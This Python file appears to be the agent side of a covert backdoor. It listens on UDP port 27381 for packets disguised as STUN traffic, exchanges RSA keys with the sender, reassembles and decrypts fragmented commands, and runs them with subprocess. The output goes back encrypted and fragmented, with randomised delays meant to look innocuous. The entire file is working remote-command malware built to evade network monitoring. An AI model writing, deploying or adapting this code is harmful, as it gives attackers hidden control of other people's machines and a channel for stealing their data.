import subprocess, rsa, socket, time, random, base64, time, gc, struct
from encryption import encrypt_message
from decryption import decrypt_message
from message_fragmentation import fragment_message
from stun import build_stun_message

my_pub_key = None
my_priv_key = None
target_pub_key = None
received_chunks = {}
expected_chunks = None
IP = "0.0.0.0"
PORT = 27381
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


def parse_public_key(text: str) -> rsa.PublicKey:
    try:
        text = text.replace("PublicKey(", "").replace(")", "")
        n_str, e_str = text.split(",")
        n = int(n_str.strip())
        e = int(e_str.strip())
        return rsa.PublicKey(n, e)
    except:
        return None


def listener():
    global my_priv_key, expected_chunks, received_chunks, sock, IP, PORT, my_pub_key, target_pub_key
    sock.bind((IP, PORT))
    while True:
        try:
            data, addr = sock.recvfrom(4096)
            if len(data) < 20:
                continue
            header = data[:20]
            attributes = data[20:]
            if len(attributes) < 4:
                continue
            msg_type, msg_length = struct.unpack('!HH', header[:4])
            magic_cookie = struct.unpack('!I', header[4:8])[0]
            if magic_cookie != 0x2112A442:
                continue
            attr_type, attr_length = struct.unpack('!HH', attributes[:4])
            cmd = attributes[4:4+attr_length]

            ip, target_port = addr
            cmd = cmd.decode('utf8')
            try:
                if cmd.startswith("gen_key"):
                    my_priv_key, my_pub_key = None, None
                    gc.collect()
                    ( my_pub_key, my_priv_key ) = rsa.newkeys(512)
                    time.sleep(1)
                    sock.sendto(build_stun_message(f"PublicKey({my_pub_key.n}, {my_pub_key.e})|1|0".encode('utf8')), (ip, target_port))
                    continue

                if cmd.startswith("PublicKey("):
                    target_pub_key = parse_public_key(cmd)
                    continue
            
                part, total, index, port = cmd.split('|', 3)
                index = int(index)
                total = int(total)
                port = int(port)
                received_chunks[index] = part
                if expected_chunks == None:
                    expected_chunks = total
                if len(received_chunks) == expected_chunks:
                    full_command = ''.join(received_chunks[i] for i in sorted(received_chunks))
                    full_command = base64.b64decode(full_command)

                    full_command = decrypt_message(full_command, my_priv_key)["message"]
                    response = subprocess.getoutput(full_command)
                    response = encrypt_message(response, target_pub_key)
                    if response["status"] == 200:
                        response = base64.b64encode(response["message"].encode()).decode()
                        chunks = fragment_message(response)

                    time.sleep(1)
                    for chunk in chunks:
                        chunk = build_stun_message(chunk)
                        jitter_delay = 0.3 + random.uniform(-0.5, 0.5)
                        jitter_delay = max(0, jitter_delay)
                        time.sleep(jitter_delay)
                        sock.sendto(chunk, (ip, port))
                    received_chunks = {}
                    expected_chunks = None

                else:
                    pass
            except Exception as e:
                print(e)
        except Exception as e:
            print(e)
        
listener()